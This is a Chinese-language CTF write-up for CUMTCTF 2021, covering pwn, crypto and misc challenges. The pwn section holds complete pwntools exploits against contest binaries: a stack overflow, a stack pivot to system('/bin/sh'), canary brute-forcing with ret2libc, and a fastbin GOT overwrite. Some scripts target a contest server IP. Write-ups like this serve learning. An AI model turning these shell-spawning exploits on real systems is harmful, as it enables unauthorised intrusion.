---
title: CUMTCTF 2021国庆赛WP（部分）
date: 2021-11-22 23:44:13
tags: [CTF,Pwn,Misc,Python]
categories: 
 - CTF
cover: https://res.cloudinary.com/sycamore/image/upload/v1682435935/Typera/2023/04/54a2923a541fe0c86555a91b264f4221.png
---

## PWN

### pwn1

nc 连上 直接cat flag

### pwn2
经典栈溢出
![image-20230425230815230](https://res.cloudinary.com/sycamore/image/upload/v1682435298/Typera/2023/04/2d25d53292a7b5602fd11b9e1127bcf1.png)

```python
from pwn import *

#r=process("./pwn2")
r=remote('1.15.81.218',10001)

p=b'a' * 72 + p64(0x400596)
r.sendline(p)

r.interactive()
```

直接传就行了...
### pwn3
开了NX保护，没开金丝雀


![image-20230425230949625](https://res.cloudinary.com/sycamore/image/upload/v1682435393/Typera/2023/04/0ac847eebeec27d62e811700f99b5b71.png)有个echo flag，感觉像是那么回事，实际上没用,

所以还是得通过system函数来搞

![image-20230425230831039](https://res.cloudinary.com/sycamore/image/upload/v1682435314/Typera/2023/04/b3a274b13eede296b71c54165bc95d53.png)

这里s大小是0x28，所以只能溢出0x8字节，不够写太长的，但是这里可以读两次，所以思路是第一次泄露ebp地址，第二次写入system(‘/bin/sh’)，然后用leave;ret栈劫持s，执行system('/bin/sh')

要劫持s要知道s的地址，可以通过动调知道ebp到s的距离，然后计算

ebp到s的距离为0xffffc1f8 - 0xffffc1c0 = 0x38

所以ebp: 

```python
p = b'a'*0x27+b'b'
r.send(p)
r.recvuntil(b'b')
ebp = u32(r.recv(4))
```

可以得到ebp的地址，然后-0x38得到s

完整exp:

```python
from pwn import *

r=process('./pwn3')
#r=remote('1.15.81.218',10002)

sys_addr=0x8048400
leave_ret=0x08048562
main_addr=0xdeadbeef

p=b'a'*0x27+b'b'
r.send(p)
r.recvuntil(b'b')
s_addr=ebp=u32(r.recv(4))-0x38  # ebp-s=0x38
print(s_addr)

p2=b'aaaa'+p32(sys_addr)+p32(main_addr)+p32(s_addr+0x10)+b"/bin/sh"
p2=p2.ljust(0x28,b'\x00')  # /bin/sh添上\x00
p2+=p32(s_addr)+p32(leave_ret)  # hijack s
r.send(p2)

r.interactive()
```
### brute?
brute canary,暴力破解金丝雀
```python
from pwn import *
from LibcSearcher import *

#r = process('./brute')
r=remote('1.15.81.218',20000)
canary = b'\x00'
def find():
    global canary,r
    #r = process('./brute')
    r=remote('1.15.81.218',20000)
    print(r.recvuntil(b'2021!\n'))
    canary = b'\x00'
    for j in range(3):
        for i in range(0x100):
            r.send(b'a'*100 + canary + bytes(chr(i).encode()))
            a = r.recvuntil(b'2021!\n')
            if b'Successfully' in a:
                canary += bytes(chr(i).encode())
                print(canary)
                break
    if(len(canary)!=4):
        find()

find()
print(canary)

elf = ELF('./brute')
system = elf.plt['system']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x08048560
p1 = b'a' * 100 + canary +b'a'*12+ p32(puts_plt) + p32(main) + p32(puts_got)
#print(r.recvuntil(b'2021!\n'))
r.sendline(p1)

puts_addr = u32(r.recv()[0:4])
print('puts_addr:',puts_addr)
libc = LibcSearcher('puts',puts_addr)
base = puts_addr - libc.dump('puts')
sys_addr = base + libc.dump('system')
bin_sh = base + libc.dump('str_bin_sh')
p2 = b'a' * 100 + canary +b'a'*12+ p32(sys_addr) +  b'a' * 4 + p32(bin_sh)
r.sendline(p2)

r.interactive()
```
爆破好慢...
CUMTCTF{5305918b-e080-4f2d-b9b1-8a6f3ed727d5
### pwn4
edit的地方有个堆溢出漏洞

l33t是后门函数，想要触发需要使位于bss的(unsigned __int64)magic > 0x1305

unsorted bin attack，修改magic的值为unsorted bin的地址，可以使magic > 0x1305

...

被坑了。。。

竟然不是这个目录。。。。。。。。。。。

然后打算修改一下system指令的字符串，发现这个字符串被存在rodata，只读

![image-20230425230855187](https://res.cloudinary.com/sycamore/image/upload/v1682435338/Typera/2023/04/4c2f5f1d77fee1973ed990605f1b4cee.png)


只能重新搞

想办法控制heaparray，

用fake chunk修改heaparray[0]为free_got的地址，然后用edit()修改free_got为system的地址

接下来就free掉一个存了 /bin/sh\x00 的chunk，这样就可以getshell了，这个可以事先创建好这样的一个chunk来实现，然后用delete_heap调用free

fake chunk的话，可以再搞两个chunk，free第一个chunk，然后修改另一个造成堆溢出来修改第一个chunk的fd指针，使其指向fake chunk

```python
from pwn import *

#r=process("./pwn4")
r=remote('1.15.81.218', 10003)
elf=ELF("./pwn4")

heaparray=0x006020E0
fake_fastbin=0x6020ad
system_addr=0x400C2C
free_got=elf.got["free"]

def create(size,content):
    r.recvuntil("Your choice :")
    r.sendline(str(1))
    r.recvuntil("Size of Heap : ")
    r.sendline(str(size))
    r.recvuntil("Content of heap:")
    r.sendline(content)
    r.recvuntil("SuccessFul")

def delete(index):
    r.recvuntil("Your choice :")
    r.sendline(str(3))
    r.recvuntil("Index :")
    r.sendline(str(index))
    r.recvuntil("Done !")

def edit(index,size,content):
    r.recvuntil("Your choice :")
    r.sendline(str(2))
    r.recvuntil("Index :")
    r.sendline(str(index))
    r.recvuntil("Size of Heap : ")
    r.sendline(str(size))
    r.recvuntil("Content of heap : ")
    r.sendline(content)
    r.recvuntil("Done !")

create(0x10,b'a' * 0x10)  # idx0
create(0x10,b'a' * 0x10)  # idx1  
create(0x60,b'b' * 0x10)  # idx2 
create(0x10,b'/bin/sh\x00')  # id3 
delete(2)
edit(1,0x30,0x10 * b'a' + p64(0) + p64(0x71) + p64(0x6020ad) + p64(0))

create(0x60,b'd' * 0x10)  # idx1  
p=0x23 * b'e' + p64(free_got)
create(0x60,p)  # idx4 
edit(0,0x8,p64(0x400C2C))

r.recvuntil(b"Your choice :")
r.sendline(str(3))
r.recvuntil(b"Index :")
r.sendline(str(3))

r.interactive()
```
### lcg
参考这个博客，可以直接出https://blog.csdn.net/superprintf/article/details/108964563
```python
from Crypto.Util.number import *

def gcd(a,b): 
    if(b==0): 
        return a 
    else: 
        return gcd(b,a%b) 

s = [64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529, 62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683, 8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192, 67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515, 3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684, 86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458, 74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723, 82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903, 79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473, 70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364]
t = []
for i in range(9):
    t.append(s[i]-s[i-1]) 
all_n = []
for i in range(7):
    all_n.append(gcd((t[i+1]*t[i-1]-t[i]*t[i]), (t[i+2]*t[i]-t[i+1]*t[i+1]))) 

MMI = lambda A, n,s=1,t=0,N=0: (n < 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n<1] #逆元计算
for n in all_n:
    n=abs(n)
    if n==1:
        continue
    print (n)
    a=(s[2]-s[1])*MMI((s[1]-s[0]),n)%n
    a_phi=MMI(a,n)
    b=(s[1]-a*s[0])%n
    seed = (a_phi*(s[0]-b))%n
    print(long_to_bytes(seed))
```

## Misc

### 加密？
跳舞的小人解出密码：SHERLOCK

打开后看到一个空白的txt文件，查看内码，零宽解出：JKGASwqeeh!@$

得到这个：63756D746374667B69745F69735F63727970746F3F7D

base16解密：cumtctf{it_is_crypto?}
### 社工？
大意了，WANG/JIA中间的斜杠还要保留

去这里扫一下机票上的二维码：[https://demo.dynamsoft.com/barcode-reader/](https://demo.dynamsoft.com/barcode-reader/)

得到信息：

![image-20230425230905993](https://res.cloudinary.com/sycamore/image/upload/v1682435349/Typera/2023/04/6761b9a34806e510c91173b2704cebfa.png)


然后去搜一下飞机票二维码的数据信息

M1就是旅客姓名

flag : cumtctf{WANG/JIA}
